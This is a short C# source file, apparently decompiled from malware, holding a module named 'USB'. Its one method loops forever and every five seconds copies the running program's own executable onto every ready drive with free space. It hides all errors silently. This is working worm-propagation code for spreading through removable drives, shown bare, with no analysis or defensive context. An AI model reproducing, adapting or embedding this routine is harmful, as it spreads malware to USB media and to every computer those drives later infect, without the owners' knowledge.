using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace n;

[StandardModule]
public sealed class USB
{
	public static void USb(string S)
	{
		while (true)
		{
			Thread.Sleep(5000);
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					if (driveInfo.IsReady && driveInfo.TotalFreeSpace > 0L)
					{
						try
						{
							File.Copy(Application.get_ExecutablePath(), driveInfo.Name + S, overwrite: true);
							File.SetAttributes(driveInfo.Name + S, FileAttributes.Normal);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}
}
